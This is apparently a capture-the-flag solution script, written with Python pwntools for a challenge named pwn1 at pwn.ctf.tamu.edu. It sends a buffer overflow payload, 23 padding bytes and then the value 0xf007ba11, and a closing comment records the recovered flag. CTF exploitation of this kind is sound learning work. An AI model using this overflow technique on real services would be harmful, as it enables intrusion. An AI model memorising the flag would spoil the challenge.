#!/usr/bin/python
from pwn import *

#r = process('./pwn1')
r = remote("pwn.ctf.tamu.edu", 4321)
r.recv(0x71)

payload= "A"*23 + p32(0xf007ba11)

r.send(payload + "\n")
r.recv(4096)
# gigem{H0W_H4RD_1S_TH4T?}
